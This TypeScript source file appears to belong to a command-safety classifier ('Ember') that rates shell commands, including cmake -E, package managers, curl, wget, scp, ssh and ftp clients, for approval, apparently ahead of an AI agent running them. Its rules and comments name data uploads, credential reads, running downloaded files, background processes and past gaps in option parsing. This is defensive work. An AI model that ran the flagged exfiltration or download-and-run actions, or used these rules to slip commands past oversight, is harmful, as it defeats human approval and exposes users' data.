function cmakeCommand(h: H, cmd: Arg | undefined, rest: Arg[]): void {
  if (!cmd) return;
  const as = (key: string, args: Arg[]): void => NATIVE[key]({ ...h, key, args });
  switch (cmd.v) {
    case "rm": as("rm", rest); return;
    case "remove": as("rm", rest.filter(a => a.v !== "-f")); return;
    case "remove_directory": as("rm", [lit("-r"), ...rest]); return;
    case "rename": as("mv", rest); return;
    case "copy": case "copy_if_different": case "copy_if_newer": as("cp", rest); return;
    case "copy_directory": case "copy_directory_if_different": case "copy_directory_if_newer": {
      // Each folder's contents go into the last one, over what is there.
      const dest = rest[rest.length - 1];
      objsOf(h, rest.slice(0, -1), "readTree");
      if (!dest) return;
      const obj = h.e.usePath(dest, "write", h.sc);
      if (obj.abs === null) { h.e.add("destroy", "posix.cp", "Writes to a file Ember can't name.", { objects: [obj] }); return; }
      h.e.judgeInside(obj.abs, "write", h.sc, obj.text);
      h.e.add("destroy", "posix.cp", `Replaces files in ${obj.text} if they exist.`, { objects: [obj], ifExists: obj.abs });
      return;
    }
    case "touch": case "touch_nocreate": as("touch", rest); return;
    case "make_directory": as("mkdir", rest); return;
    // An existing link or file of that name is replaced.
    case "create_symlink": case "create_hardlink": as("ln", [lit("-f"), ...rest]); return;
    case "tar": as("tar", rest); return;
    case "time": h.e.payload(rest, h.sc, "cmake -E time"); return;
    case "env": as("env", rest); return;
    case "chdir": {
      const dir = rest[0];
      if (!dir) return;
      const cwd = h.e.usePath(dir, "cd", h.sc).abs;
      h.e.payload(rest.slice(1), child(h.sc, { cwd }), "cmake -E chdir");
      return;
    }
    case "environment": h.e.add("secret", "secret.env", SAYS.env); return;
    case "cat": h.e.readArgs(rest, h.sc, { unresolvedUnclear: true }); return;
    case "echo": case "echo_append": textProgram({ ...h, args: rest }); return;
    case "compare_files": case "md5sum": case "sha1sum": case "sha224sum": case "sha256sum": case "sha384sum": case "sha512sum":
      h.e.readArgs(rest, h.sc, { unresolvedUnclear: true }); return;
    case "capabilities": case "true": case "false": case "sleep": return;
    case "delete_regv": case "write_regv": h.e.add("system", "system.registry", "Changes the Windows registry."); return;
    default: h.e.unclear("unclear.cmake-command", "Ember can't tell which cmake command this runs.");
  }
}

// System package managers (§3.5.5).
reg(NATIVE, Object.keys(SYSTEM_PACKAGERS), h => {
  const read = SYSTEM_PACKAGERS[h.key].read;
  if (read.includes("*")) return;
  const g = GLOBAL_OPTIONS[h.key] ? globals(h, h.key) : null;
  if (g) checkGlobals(h, h.key, g);
  const start = g ? g.verbAt : firstOperand(h.args).at;
  const verbArg = h.args[start];
  let verb = verbArg?.v ?? null;
  if (h.key === "pacman" || h.key === "emerge" || h.key === "nix-env" || h.key === "xbps" || h.key === "urpmi") {
    const flags = h.args.map(a => a.v ?? "");
    if (h.key === "pacman" && flags.every(f => !/^-[A-Za-z]*[SRUD]|^--(sync|remove|upgrade|database)/.test(f))) return;
    if (h.key === "emerge" && flags.some(f => read.includes(f))) return;
    if (h.key === "nix-env" && flags.some(f => read.includes(f))) return;
    languageOrSystem(h, h.args.filter(a => !isOption(a)));
    return;
  }
  if (verb === null) { if (verbArg) h.e.unclear("unclear.package-verb", "Ember can't tell which command this runs."); return; }
  verb = verb.toLowerCase();
  if (read.includes(verb)) return;
  if (h.key === "winget" && (verb === "source" || verb === "settings") ) return;
  // A package manager's own service verbs start, stop or set up a daemon that runs on after the command and after
  // Stop: filed as a service, where the approval modes read what outlives the kill switch (modes-y9-1).
  if ((h.key === "brew" && verb === "services") || (h.key === "snap" && /^(start|restart|stop|enable|disable|set|unset)$/.test(verb))) {
    const sub = h.key === "brew" ? h.args.slice(start + 1).find(a => !isOption(a))?.v ?? null : verb;
    if (sub === null || !/^(list|ls|info)$/.test(sub)) h.e.add("system", "service.change", "Starts, stops or changes a system service.", { program: `${h.prog} ${verb}` });
  }
  // `flatpak run` opens the app, as a launcher does.
  if (h.key === "flatpak" && verb === "run") h.e.unclear("unclear.gui", SAYS.openApp);
  languageOrSystem(h, h.args.slice(start + 1).filter(a => !isOption(a)));
});
function languageOrSystem(h: H, specs: Arg[]): void {
  const objects = packageObjects(h, specs);
  h.e.add("system", "pkg.system", "Installs, removes or upgrades software.", { objects, program: `${h.prog} ${h.args.find(a => !isOption(a))?.v ?? ""}`.trim() });
}
reg(NATIVE, ["dpkg", "rpm"], h => {
  const flags = h.args.map(a => a.v ?? "");
  const write = h.key === "dpkg"
    ? flags.some(f => /^-([a-zA-Z]*[irPa]|-install|-remove|-purge|-unpack|-configure|-set-selections|-add-architecture|-remove-architecture)/.test(f) || /^--(install|remove|purge|unpack|configure|triggers-only|set-selections|clear-selections|add-architecture|remove-architecture|update-avail|merge-avail)$/.test(f))
    : flags.some(f => /^-[a-zA-Z]*[iUeF]/.test(f) && !/^-q/.test(f) || /^--(install|upgrade|erase|freshen|import|reinstall|setperms|setugids|restore|initdb|rebuilddb)$/.test(f));
  // `dpkg -x pkg.deb dir` / `--extract` / `-X` unpacks a package into a folder: a download's contents land there, so
  // running one of them later asks (commands-remote-r8-2).
  if (h.key === "dpkg" && flags.some(f => /^-[a-zA-Z]*[xX]/.test(f) || /^--(extract|vextract|fsys-tarfile)$/.test(f))) {
    const ops = h.args.filter(a => !isOption(a));
    if (ops[0] && h.e.isDownloaded(ops[0], h.sc)) { if (ops[1]?.v) h.e.markUnnamed(ops[1].v, h.sc); else h.e.markUnnamed(null, h.sc); }
  }
  if (write) languageOrSystem(h, h.args.filter(a => !isOption(a)));
  else h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc);
});
reg(NATIVE, ["softwareupdate", "installer", "msiexec", "pkgutil", "dism", "add-appxpackage", "pnputil", "mas"], h => {
  const flags = h.args.map(a => (a.v ?? "").toLowerCase());
  if (h.key === "softwareupdate" && !flags.some(f => /^(-i|--install|-a|--all|--download|-d|--install-rosetta|--fetch-full-installer)$/.test(f))) return;
  if (h.key === "pkgutil" && !flags.some(f => /^--(forget|unlink|expand|flatten)/.test(f))) return;
  if (h.key === "dism" && !flags.some(f => /\/(enable-feature|disable-feature|add-package|remove-package|add-capability|remove-capability|add-driver|remove-driver|apply-image|cleanup-image|set-edition|online)/.test(f))) return;
  if (h.key === "dism" && flags.includes("/online") && !flags.some(f => /\/(enable-feature|disable-feature|add-package|remove-package|add-capability|remove-capability|add-driver|remove-driver|cleanup-image|set-edition)/.test(f))) return;
  if (h.key === "pnputil" && !flags.some(f => /^[/-](add-driver|delete-driver|install|remove-device|disable-device|enable-device|restart-device|i|a|d)/.test(f))) return;
  h.e.add("system", "pkg.system", "Installs, removes or upgrades software.");
  for (const a of h.args) if (a.v && /\.(msi|pkg|msix|appx|msixbundle|appxbundle)$/i.test(a.v) && h.e.isDownloaded(a, h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
});

// ------------------------------------------------------------------------------------------------------------------
// The network (§3.5.2): sending data anywhere is class b.

/**
 * The words an option's values were given as: a value Ember sees as a literal, one it can't see all of as written
 * (its next word, or the pieces of one attached before a command: Opt.parts), so the values a variable is given count.
 */
function optionWords(args: readonly Arg[], p: Parsed, ...names: string[]): Arg[] {
  return p.opts.filter(o => o.value !== undefined && names.some(n => optIs(o.name, n))).map(o => {
    if (typeof o.value === "string") return lit(o.value);
    if (o.parts) return { v: null, raw: args[o.at]?.raw ?? "", glob: false, parts: o.parts };
    const next = args[o.at + 1];
    return args[o.at]?.v !== null && next !== undefined && next.v === null ? next : { v: null, raw: args[o.at]?.raw ?? "", glob: false };
  });
}

/** The host of a URL or `user@host:path`. */
function hostOf(s: string): string {
  const u = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/]*@)?(\[[^\]]+\]|[^/:?#]+)/i.exec(s);
  if (u) return u[1];
  const scp = /^(?:[^@/]+@)?([^:/]+):/.exec(s);
  return scp ? scp[1] : s;
}

reg(NATIVE, ["curl", "curl.exe"], h => {
  // Main's table knew no -Q and none of the options after --mail-auth, so the word after one was an address or an
  // option of its own: judged that way too (commands-held-8).
  const p = heldOpts(h, {
    shortValue: "AbcCdeEFHKmoPrtTuUwXxyYzDQ",
    longValue: ["data", "data-raw", "data-binary", "data-urlencode", "data-ascii", "json", "form", "form-string", "upload-file", "request", "header", "user", "output", "cookie", "cookie-jar", "config", "url", "proxy", "user-agent", "referer", "max-time", "connect-timeout", "retry", "cacert", "cert", "key", "pass", "oauth2-bearer", "aws-sigv4", "output-dir", "write-out", "dump-header", "trace", "trace-ascii", "stderr", "resolve", "interface", "limit-rate", "range", "max-filesize", "proto", "proxy-user", "netrc-file", "unix-socket", "abstract-unix-socket", "ciphers", "variable", "expand-data", "time-cond", "continue-at", "retry-delay", "retry-max-time", "speed-limit", "speed-time", "local-port", "dns-servers", "doh-url", "preproxy", "hsts", "alt-svc", "etag-save", "etag-compare", "krb", "login-options", "sasl-authzid", "service-name", "mail-from", "mail-rcpt", "mail-auth",
      // The rest of curl 8's options that take a value (`curl --help all`), so none of their values reads as an address.
      "capath", "cert-type", "connect-to", "create-file-mode", "crlfile", "curves", "delegation", "dns-interface", "dns-ipv4-addr", "dns-ipv6-addr",
      "egd-file", "engine", "expect100-timeout", "ftp-account", "ftp-alternative-to-user", "ftp-method", "ftp-port", "ftp-ssl-ccc-mode",
      "happy-eyeballs-timeout-ms", "hostpubmd5", "hostpubsha256", "ipfs-gateway", "keepalive-time", "key-type", "libcurl", "max-redirs", "noproxy",
      "parallel-max", "pinnedpubkey", "proto-default", "proto-redir", "proxy-cacert", "proxy-capath", "proxy-cert", "proxy-cert-type", "proxy-ciphers",
      "proxy-crlfile", "proxy-header", "proxy-key", "proxy-key-type", "proxy-pass", "proxy-pinnedpubkey", "proxy-service-name", "proxy-tls13-ciphers",
      "proxy-tlsauthtype", "proxy-tlspassword", "proxy-tlsuser", "pubkey", "quote", "random-file", "rate", "request-target", "socks4", "socks4a", "socks5",
      "socks5-gssapi-service", "socks5-hostname", "telnet-option", "tftp-blksize", "tls-max", "tls13-ciphers", "tlsauthtype", "tlspassword", "tlsuser",
      "trace-config", "url-query"],
  }, { shortValue: "AbcCdeEFHKmoPrtTuUwXxyYzD", longValue: ["data", "data-raw", "data-binary", "data-urlencode", "data-ascii", "json", "form", "form-string", "upload-file", "request", "header", "user", "output", "cookie", "cookie-jar", "config", "url", "proxy", "user-agent", "referer", "max-time", "connect-timeout", "retry", "cacert", "cert", "key", "pass", "oauth2-bearer", "aws-sigv4", "output-dir", "write-out", "dump-header", "trace", "trace-ascii", "stderr", "resolve", "interface", "limit-rate", "range", "max-filesize", "proto", "proxy-user", "netrc-file", "unix-socket", "abstract-unix-socket", "ciphers", "variable", "expand-data", "time-cond", "continue-at", "retry-delay", "retry-max-time", "speed-limit", "speed-time", "local-port", "dns-servers", "doh-url", "preproxy", "hsts", "alt-svc", "etag-save", "etag-compare", "krb", "login-options", "sasl-authzid", "service-name", "mail-from", "mail-rcpt", "mail-auth"] });
  const urls = [...p.operands.map(a => a.v ?? ""), ...values(p, "url").map(v => v ?? "")].filter(u => u !== "");
  const host = hostOf(urls[0] ?? "") || "another computer";
  for (const u of urls) if (/^file:/i.test(u)) h.e.usePath(lit(decodeURIComponent(u.replace(/^file:\/\/(localhost)?/i, ""))), "read", h.sc);
  // What the file says it fetches, and where it saves it, Ember can't see: a download of no name it knows, anywhere
  // (commands-remote-r8-3).
  if (values(p, "K", "config").length) { h.e.unclear("unclear.curl-config", "It reads its options from a file Ember can't see."); h.e.markUnnamed(null, h.sc); }
  if (has(p, "n", "netrc") || values(p, "netrc-file").length) h.e.add("secret", "secret.netrc", SAYS.secrets);
  for (const f of values(p, "netrc-file")) if (f) h.e.usePath(lit(f), "read", h.sc);
  if (values(p, "u", "user", "proxy-user").some(u => u !== null && u.includes(":") && !u.endsWith(":")) || values(p, "oauth2-bearer").length) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  for (const k of values(p, "key", "E", "cert")) if (k) h.e.usePath(lit(k.split(":")[0]), "read", h.sc);
  const uploads = values(p, "T", "upload-file");
  for (const u of uploads) if (u) h.e.usePath(lit(u), "read", h.sc);
  const dataFiles = [...values(p, "d", "data", "data-binary", "data-urlencode", "data-ascii", "json"), ...values(p, "F", "form").map(f => (f ?? "").replace(/^[^=]*=/, ""))].filter(d => d && d.startsWith("@")).map(d => d!.slice(1).split(";")[0]);
  for (const f of dataFiles) if (f !== "-") h.e.usePath(lit(f), "read", h.sc);
  const method = (values(p, "X", "request")[0] ?? "").toUpperCase();
  const objects: Obj[] = [{ kind: "host", text: host, abs: null }, ...uploads.map(u => ({ kind: "path" as const, text: u ?? "?", abs: null }))];
  if (uploads.length) h.e.add("publish", "upload.curl", `Sends data to ${host}.`, { objects, program: "curl" });
  else if (values(p, "d", "data", "data-raw", "data-binary", "data-urlencode", "data-ascii", "json", "F", "form", "form-string").length || /^(POST|PUT|PATCH|DELETE)$/.test(method) || values(p, "mail-rcpt").length) {
    h.e.add("publish", "send.http", `Sends data to ${host}.`, { objects, program: "curl" });
  }
  const outDir = values(p, "output-dir")[0] ?? null;
  // A folder Ember can't see (`--output-dir "$d"`): whatever it saves there is a download of no name Ember knows.
  if (values(p, "output-dir").some(d => d === null)) h.e.downloadUnnamed(null, h.sc);
  for (const w of optionWords(h.args, p, "o", "output")) {
    const o = w.v;
    // A name Ember can't see all of (`-o "$f"`): the names the text gives it, else unnamed (commands-remote-r5-1).
    if (o === null) { h.e.downloadTo(outDir ? { ...w, parts: [`${outDir}/`, ...(w.parts ?? [{ name: null }])] } : w, h.sc); continue; }
    if (o === "-") continue;
    const path = outDir ? `${outDir}/${o}` : o;
    const obj = h.e.usePath(lit(path), "write", h.sc);
    if (obj.abs) h.e.add("destroy", "download.output", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
    h.e.download(path, h.sc);
    // `-o '#1.sh'` with an address's {a,b} or [1-3]: a name from each address, none of which Ember names.
    if (/#\d/.test(o)) h.e.downloadUnnamed(path.includes("/") ? path.slice(0, path.lastIndexOf("/") + 1) : ".", h.sc);
  }
  // -J saves under the name the server sends, when it sends one (commands-remote-c5-2).
  if (has(p, "O", "remote-name", "remote-name-all") && has(p, "J", "remote-header-name")) h.e.downloadUnnamed(outDir ?? ".", h.sc);
  if (has(p, "O", "remote-name", "remote-name-all")) {
    // The name each address ends in; an address a variable holds part of gives the names the text gives it, and one
    // whose name Ember can't see, or that curl's `[1-3]` or `{a,b}` makes several of, is a download of no name Ember
    // knows in the folder it saves into (commands-remote-r6-1).
    let unnamed = false;
    for (const w of [...p.operands, ...optionWords(h.args, p, "url")]) {
      const got = h.e.addressNames(w, { patterns: !has(p, "g", "globoff") });
      unnamed ||= got.unnamed;
      for (const name of got.names) {
        const path = outDir ? `${outDir}/${name}` : name;
        const obj = h.e.usePath(lit(path), "write", h.sc);
        if (obj.abs) h.e.add("destroy", "download.output", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
        h.e.download(path, h.sc);
      }
    }
    if (unnamed && !values(p, "output-dir").some(d => d === null)) h.e.downloadUnnamed(outDir ?? ".", h.sc);
  }
  for (const f of values(p, "c", "cookie-jar", "D", "dump-header", "trace", "trace-ascii", "stderr", "etag-save", "hsts", "alt-svc")) if (f && f !== "-") h.e.usePath(lit(f), "write", h.sc);
});
reg(NATIVE, ["wget", "wget2"], h => {
  // The value options main's table had; it knew none of the others, so the option after one of them (`wget --backups -O
  // run.sh URL`, `--ciphers -o FILE`) was read as an option of its own: judged that way too (commands-held-9).
  const mainLong = ["output-document", "output-file", "append-output", "directory-prefix", "input-file", "base", "tries", "timeout", "wait", "quota", "execute", "user-agent", "level", "accept", "reject", "include-directories", "exclude-directories", "domains", "exclude-domains", "post-data", "post-file", "method", "body-data", "body-file", "header", "user", "password", "http-user", "http-password", "ftp-user", "ftp-password", "load-cookies", "save-cookies", "certificate", "private-key", "ca-certificate", "config", "referer", "limit-rate", "restrict-file-names", "default-page", "bind-address", "proxy-user", "proxy-password"];
  const p = heldOpts(h, {
    shortValue: "OoaPiBtTwQeUlAIRDXlY",
    longValue: [...mainLong,
      "accept-regex", "backups", "ca-directory", "certificate-type", "ciphers", "compression", "connect-timeout", "crl-file", "cut-dirs", "dns-timeout",
      "follow-tags", "ignore-tags", "local-encoding", "pinnedpubkey", "prefer-family", "private-key-type", "progress", "random-file", "read-timeout",
      "regex-type", "reject-regex", "rejected-log", "remote-encoding", "report-speed", "retry-on-http-error", "secure-protocol", "start-pos", "use-askpass",
      "waitretry", "warc-dedup", "warc-file", "warc-header", "warc-max-size", "warc-tempdir"],
  }, { shortValue: "OoaPiBtTwQeUlAIRDXlY", longValue: mainLong });
  const host = hostOf(p.operands.map(a => a.v ?? "").filter(u => u)[0] ?? "") || "another computer";
  const method = (values(p, "method")[0] ?? "").toUpperCase();
  for (const f of values(p, "post-file", "body-file", "i", "input-file", "load-cookies", "certificate", "private-key")) if (f && f !== "-") h.e.usePath(lit(f), "read", h.sc);
  if (values(p, "post-data", "post-file", "body-data", "body-file").length || /^(POST|PUT|PATCH|DELETE)$/.test(method)) h.e.add("publish", "send.http", `Sends data to ${host}.`, { objects: [{ kind: "host", text: host, abs: null }], program: "wget" });
  if (values(p, "e", "execute").length) { h.e.unclear("unclear.wget-execute", "It runs settings Ember can't see."); h.e.markUnnamed(null, h.sc); }
  if (h.args.some(a => /^--use-askpass/.test(a.v ?? ""))) h.e.unclear("unclear.wget-askpass", "It runs a program Ember can't see.");
  if (values(p, "config").length) { h.e.unclear("unclear.curl-config", "It reads its options from a file Ember can't see."); h.e.markUnnamed(null, h.sc); }
  const dir = values(p, "P", "directory-prefix")[0];
  const out = values(p, "O", "output-document")[0];
  if (out !== undefined) {
    if (out === null) h.e.downloadTo(optionWords(h.args, p, "O", "output-document")[0] ?? { v: null, raw: "", glob: false }, h.sc);
    else if (out !== "-") {
      const obj = h.e.usePath(lit(out), "write", h.sc);
      if (obj.abs) h.e.add("destroy", "download.output", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
      h.e.download(out, h.sc);
    }
  } else {
    // The folder it saves into (-P) and each file by the name its address ends in meet §3.6's rules, Ember's own files
    // included (review #169); wget may pick another name (a redirect, -r's folders), so the folder is judged too.
    if (dir === null) h.e.downloadUnnamed(null, h.sc);
    else if (dir !== undefined) writeInto(h, dir);
    // -x keeps the address's folders, under the host's (with its port, as written): the file lands at host/path
    // (commands-remote-c7-3). The name alone is marked as well, as on main, whatever the options: -nd, or -nH with no
    // folders left, saves it there, and both may stand in a cluster or be cut short (`-xnH`, `--no-host-dir`), so a
    // hint of -nH marks the place with the host's folder and without it (commands-remote-x7-2).
    const tree = has(p, "x", "force-directories");
    const noHost = h.args.some(a => a.v !== null && (/^-[A-Za-z]*nH/.test(a.v) || (a.v.length >= 6 && "--no-host-directories".startsWith(a.v))));
    // A count of folders to drop that Ember can't read leaves a name it can't place.
    const cuts = values(p, "cut-dirs");
    const cutWord = cuts.length ? cuts[cuts.length - 1] : "0";
    const cut = cutWord !== null && /^\d{1,3}$/.test(cutWord) ? Number(cutWord) : null;
    let unnamed = false;
    for (const u of p.operands) {
      // An address a variable holds part of gives the names the text gives it; a name Ember can't see is a download
      // of no name it knows, in the folder it saves into (commands-remote-r6-1).
      const got = h.e.addressNames(u, { fallback: "index.html" });
      unnamed ||= got.unnamed;
      for (const name of got.names) saveAs(h, dir ? `${dir}/${name}` : name);
      if (!tree) continue;
      const m = u.v === null ? null : /^(?:([a-z][a-z0-9+.-]*):\/\/)?(?:[^@/]*@)?([^/?#]+)(\/[^?#]*)?/i.exec(u.v);
      if (!m || cut === null) unnamed = true;
      if (!m) continue;
      const dirs = (m[3] ?? "/").split("/").slice(1);
      const name = dirs.pop() || "index.html";
      // wget drops the scheme's own port from the folder's name (`https://host:443/…` saves under host/), so the
      // folder is marked with the port and without it (commands-remote-y7-2).
      for (const host of [...(noHost ? [[]] : []), ...[...new Set([m[2], m[2].replace(/:\d+$/, "")])].map(x => [x])]) {
        const under = [...(has(p, "protocol-directories") ? [m[1] ?? "http"] : []), ...host, ...dirs.slice(cut ?? 0), name].join("/");
        saveAs(h, dir ? `${dir}/${under}` : under);
      }
    }
    if (unnamed && dir !== null) h.e.downloadUnnamed(dir ?? ".", h.sc);
    // Names the server or a list picks, and a recursion's or a page's files (commands-remote-c5-2).
    const picked = has(p, "r", "recursive", "m", "mirror", "p", "page-requisites", "content-disposition", "trust-server-names") || values(p, "i", "input-file").length > 0;
    if (picked && dir !== null) h.e.downloadUnnamed(dir ?? ".", h.sc);
  }
  for (const f of values(p, "a", "append-output")) if (f) h.e.append(lit(f), h.sc, "redirect.append");
  for (const f of values(p, "o", "output-file", "save-cookies")) if (f) overwrites(h, lit(f));
});
reg(NATIVE, ["http", "https", "xh", "xhs", "httpie"], h => {
  const ops = h.args.filter(a => !isOption(a)).map(a => a.v ?? "");
  const hasMethod = /^(POST|PUT|PATCH|DELETE)$/.test(ops[0] ?? "");
  const url = hasMethod ? ops[1] : ops[0];
  const items = ops.slice(hasMethod ? 2 : 1);
  if (hasMethod || items.some(i => /^[^=:@]+(:?=|@)/.test(i)) || h.args.some(a => /^(-f|--form|--raw)$/.test(a.v ?? ""))) h.e.add("publish", "send.http", `Sends data to ${hostOf(url ?? "")}.`);
  for (const i of items) { const m = /^[^=:@]+(?:=@|:=@|@)(.+)$/.exec(i); if (m) h.e.usePath(lit(m[1]), "read", h.sc); }
  // -o saves the answer to a file; -d (--download) without one saves it under the name the server or the address
  // gives, which Ember can't be sure of (commands-remote-c7-3).
  // The name may be written straight after -o, in a cluster too (`-orun.sh`, `-dorun.sh`: commands-remote-x7-8).
  const k = h.args.findIndex(a => a.v === "-o" || a.v === "--output" || /^-[A-Za-z]*o$/.test(a.v ?? ""));
  const attached = h.args.find(a => /^--output=/.test(a.v ?? ""));
  const short = /^-[A-Za-np-z]*o(.+)$/.exec(h.args.find(a => /^-[A-Za-np-z]*o./.test(a.v ?? "") && !(a.v ?? "").startsWith("--"))?.v ?? "");
  const out = k >= 0 ? h.args[k + 1] : attached?.v ? lit(attached.v.slice("--output=".length)) : short ? lit(short[1]) : undefined;
  if (out !== undefined) {
    if (out.v === null) h.e.downloadTo(out, h.sc);
    else { overwrites(h, out, "download.output"); h.e.download(out.v, h.sc); }
  } else if (h.args.some(a => a.v === "--download" || /^-[A-Za-z]*d[A-Za-z]*$/.test(a.v ?? ""))) h.e.downloadUnnamed(".", h.sc);
});
/**
 * A folder a program saves files into by names Ember can't be sure of (wget -P, aria2c -d, git checkout-index
 * --prefix): the folder and a file in it are judged as written by §3.6's rules (review #169). Only the rules: the
 * folder isn't remembered as written, so a script in it that this command runs is still read first (L8), as before.
 */
function writeInto(h: H, dir: string): void {
  const mark = h.e.written.length;
  const obj = h.e.usePath(lit(dir), "write", h.sc);
  if (obj.abs !== null) h.e.judgeInside(obj.abs, "write", h.sc, dir);
  h.e.written.length = mark;
}
/** A file a download saves: written (§3.6's rules) and recorded as downloaded (§3.4.7). */
function saveAs(h: H, path: string): void {
  h.e.usePath(lit(path), "write", h.sc);
  h.e.download(path, h.sc);
}
reg(NATIVE, ["aria2c", "fetch", "axel", "lwp-download"], h => {
  const p = opts(h, { shortValue: h.key === "aria2c" ? "odi" : h.key === "lwp-download" ? "" : "o", longValue: ["out", "dir", "input-file", "output"] });
  for (const f of values(p, "i", "input-file")) if (f && !STDIN_NAME.test(f)) h.e.usePath(lit(f), "read", h.sc);
  // Where it saves (review #169): aria2c's -d folder (-o names a file in it), fetch's and axel's -o (a file or a
  // folder), lwp-download's second operand (the same); otherwise the name the address ends in.
  // A folder or a name Ember can't see all of (`-d "$d"`, `-o "$f"`) is a download as curl's and wget's are: the names
  // the text gives it, else unnamed, so running what it saved asks (commands-remote-x6-3).
  const dir = h.key === "aria2c" ? values(p, "d", "dir")[0] : undefined;
  if (dir === null) h.e.downloadUnnamed(null, h.sc);
  else if (dir !== undefined) writeInto(h, dir);
  const at = (name: string): string => (dir ? `${dir}/${name}` : name);
  const named = (u: Arg): string | null => (u.v ? u.v.replace(/[?#].*$/, "").split("/").pop() || "index.html" : null);
  // An address a variable holds part of: the names the text gives it, else a download of no name Ember knows in the
  // folder it saves into (commands-remote-r6-1).
  const byAddress = (u: Arg): void => {
    const got = h.e.addressNames(u, { fallback: "index.html" });
    for (const name of got.names) saveAs(h, at(name));
    if (got.unnamed && dir !== null) h.e.downloadUnnamed(dir ?? ".", h.sc);
  };
  const outs = optionWords(h.args, p, "o", "out", "output");
  for (const w of outs) {
    if (w.v === null) h.e.downloadTo(dir ? { ...w, parts: [`${dir}/`, ...(w.parts ?? [{ name: null }])] } : w, h.sc);
    else if (w.v !== "-") saveAs(h, at(w.v));
  }
  if (h.key === "lwp-download" && p.operands.length >= 2) {
    const [url, to] = p.operands;
    if (to.v === null) { h.e.downloadTo(to, h.sc); return; }
    saveAs(h, to.v);
    // A folder gets the file by the address's name.
    const name = named(url);
    if (name) h.e.usePath(lit(`${to.v.replace(/[\\/]+$/, "")}/${name}`), "write", h.sc);
    return;
  }
  if (outs.length === 0) for (const u of p.operands) byAddress(u);
  // aria2c's list of addresses (-i): names Ember can't see, in its folder (commands-remote-c5-2).
  if (h.key === "aria2c" && values(p, "i", "input-file").length && dir !== null) h.e.downloadUnnamed(dir ?? ".", h.sc);
});

reg(NATIVE, ["scp", "pscp"], h => {
  const p = opts(h, { shortValue: "cFiJloPSDX", longValue: [] });
  sshOptions(h, p);
  const ops = p.operands;
  if (ops.length < 2) return;
  const dest = ops[ops.length - 1];
  const sources = ops.slice(0, -1);
  const remote = (a: Arg): boolean => a.v !== null && (SCP_LIKE.test(a.v) || /^scp:\/\//i.test(a.v)) && !/^[A-Za-z]:[\\/]/.test(a.v);
  if (dest.v === null) { h.e.unclear("unclear.unresolved-arg", "Ember can't tell where scp copies to."); return; }
  if (remote(dest)) {
    const host = hostOf(dest.v);
    const files = sources.filter(s => !remote(s));
    objsOf(h, files, has(p, "r") ? "readTree" : "read");
    h.e.add("publish", "upload.scp", `Sends data to ${host}.`, { objects: [{ kind: "host", text: host, abs: null }, ...files.map(f => ({ kind: "path" as const, text: f.v ?? f.raw, abs: null }))], program: "scp" });
    return;
  }
  if (sources.some(remote)) {
    const obj = h.e.usePath(dest, "write", h.sc);
    if (obj.abs) h.e.add("destroy", "posix.cp", `Replaces ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
    h.e.download(dest.v, h.sc);
    return;
  }
  copyLike({ ...h, args: ops }, "cp");
  // A source Ember can't see may be another computer's file (`scp "$H:run.sh" .`): where it lands is a download
  // (commands-remote-r7-3).
  if (sources.some(s => s.v === null)) h.e.download(dest.v, h.sc);
});
/** ssh-family options: code-running settings, identity files, port forwarding, background. */
function sshOptions(h: H, p: Parsed): void {
  for (const o of values(p, "o")) {
    if (o === null) continue;
    if (/^(ProxyCommand|LocalCommand|PermitLocalCommand|KnownHostsCommand|RemoteCommand|Match)\b/i.test(o.replace(/\s*=\s*/, " "))) h.e.unclear("unclear.ssh-command-option", "It runs a command from an ssh setting.");
    const id = /^IdentityFile[\s=]+(.+)$/i.exec(o);
    if (id) h.e.usePath(lit(id[1]), "read", h.sc);
  }
  for (const i of values(p, "i")) if (i) h.e.usePath(lit(i), "read", h.sc);
  for (const f of values(p, "F")) if (f) h.e.usePath(lit(f), "read", h.sc);
}
reg(NATIVE, ["ssh", "slogin", "autossh", "mosh"], h => {
  // -M (master mode) takes no value (commands-remote-i5a).
  // Main's table gave -M the next word, so the host was the word after it: judged that way too (commands-held-8).
  const p = heldOpts(h, { shortValue: "BbcDEeFIiJLlmOoPpQRSWw", stopAtOperand: true }, { shortValue: "BbcDEeFIiJLlmOoPpQRSWwM", stopAtOperand: true });
  sshOptions(h, p);
  const host = p.operands[0]?.v ?? null;
  const cmd = p.operands.slice(1);
  if (has(p, "f")) h.e.add("escape", "escape.background", SAYS.keepsRunning);
  if (values(p, "L", "R", "D", "W").length) h.e.add("publish", "send.ssh", `Forwards connections through ${host ?? "another computer"}.`, { objects: [{ kind: "host", text: host ?? "?", abs: null }] });
  if (host === null) { if (p.operands.length) h.e.unclear("unclear.unresolved-arg", "Ember can't tell which computer this reaches."); return; }
  const hostName = host.replace(/^ssh:\/\//, "").replace(/^[^@]*@/, "").replace(/:\d+$/, "");
  if (cmd.length || h.s.stdin !== null) h.e.add("publish", "send.ssh", `Sends data to ${hostName}.`, { objects: [{ kind: "host", text: hostName, abs: null }], program: "ssh" });
  else if (!has(p, "N") && !has(p, "O") && !has(p, "G") && !has(p, "V")) h.e.unclear("unclear.interactive", SAYS.interactive);
});
reg(NATIVE, ["sftp", "ftp", "lftp", "tftp", "ncftp", "ncftpput", "smbclient", "telnet"], h => {
  const target = h.args.filter(a => !isOption(a))[0]?.v ?? "another computer";
  h.e.add("publish", h.key === "sftp" ? "upload.sftp" : "send.ftp", `Sends data to ${hostOf(target)}.`, { objects: [{ kind: "host", text: hostOf(target), abs: null }], program: h.key });
  const batch = h.args.some(a => /^-(b|c|s:|s|f)/.test(a.v ?? "")) || h.s.stdin !== null;
  if (!batch) h.e.unclear("unclear.interactive", SAYS.interactive);
  if (h.args.some(a => /^-U$/.test(a.v ?? "")) && h.args.some(a => /%/.test(a.v ?? ""))) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  for (const a of h.args) if (/^-[A]$/.test(a.v ?? "")) h.e.usePath(h.args[h.args.indexOf(a) + 1] ?? lit("?"), "read", h.sc);
  if (clientMayFetch(h)) h.e.markUnnamed(null, h.sc);
});
/** Commands a file-transfer client may be given that only send, list or move about, never fetch (clientMayFetch). */
